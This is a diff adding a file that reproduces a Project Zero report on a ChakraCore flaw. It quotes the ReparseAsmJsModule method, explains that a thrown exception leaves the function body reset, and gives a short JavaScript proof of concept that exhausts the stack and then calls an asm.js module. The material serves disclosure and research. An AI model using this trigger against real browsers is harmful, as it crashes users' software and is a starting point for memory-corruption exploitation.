@@ -1,0 +1,47 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1327
+
+Here's the method used to re-parse asmjs modules.
+void JavascriptFunction::ReparseAsmJsModule(ScriptFunction** functionRef)
+{
+    ParseableFunctionInfo* functionInfo = (*functionRef)->GetParseableFunctionInfo();
+    Assert(functionInfo);
+    functionInfo->GetFunctionBody()->AddDeferParseAttribute();
+    functionInfo->GetFunctionBody()->ResetEntryPoint();
+    functionInfo->GetFunctionBody()->ResetInParams();
+
+    FunctionBody * funcBody = functionInfo->Parse(functionRef);
+
+#if ENABLE_PROFILE_INFO
+    // This is the first call to the function, ensure dynamic profile info
+    funcBody->EnsureDynamicProfileInfo();
+#endif
+
+    (*functionRef)->UpdateUndeferredBody(funcBody);
+}
+
+First, it resets the function body and then re-parses it. But it doesn't consider that "functionInfo->Parse(functionRef);" may throw an exception. So in the case, the function body remains reseted(invalid).
+
+We can make it throw an exception simply by exhausting the stack. 
+
+PoC:
+-->
+
+function Module() {
+    'use asm';
+
+    function f() {
+    }
+
+    return f;
+}
+
+function recur() {
+    try {
+        recur();
+    } catch (e) {
+        Module(1);
+    }
+}
+
+recur();
